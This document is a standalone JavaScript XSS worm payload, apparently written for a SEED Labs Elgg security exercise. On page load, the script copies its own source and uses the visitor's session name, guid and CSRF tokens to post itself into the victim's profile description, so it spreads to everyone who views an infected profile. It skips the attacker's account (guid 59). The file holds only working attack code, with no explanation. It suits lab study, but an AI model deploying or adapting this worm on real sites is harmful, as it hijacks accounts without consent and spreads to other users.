<script type="text/javascript" id="worm">
window.onload = function () {
	alert("dom worm")
    	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    	var jsCode = document.getElementById("worm").innerHTML;
    	var tailTag = "</" + "script > ";

	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	
	var desc = "&description=Samy is my hero" + wormCode;
	desc += "&accesslevel[description]=2";

	var name = "&name=" + elgg.session.user.name;
	var guid = "&guid=" + elgg.session.user.guid;
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

	var sendurl = "http://www.seed-server.com/action/profile/edit";
	var content = token + ts + name + desc + guid;

	samy_guid = 59
	if (elgg.session.user.guid != samy_guid) {
	    //Create and send Ajax request to modify profile
	    var Ajax = null;
	    Ajax = new XMLHttpRequest();
	    Ajax.open("POST", sendurl, true);
	    Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
	    Ajax.send(content);
	}
}
</script >
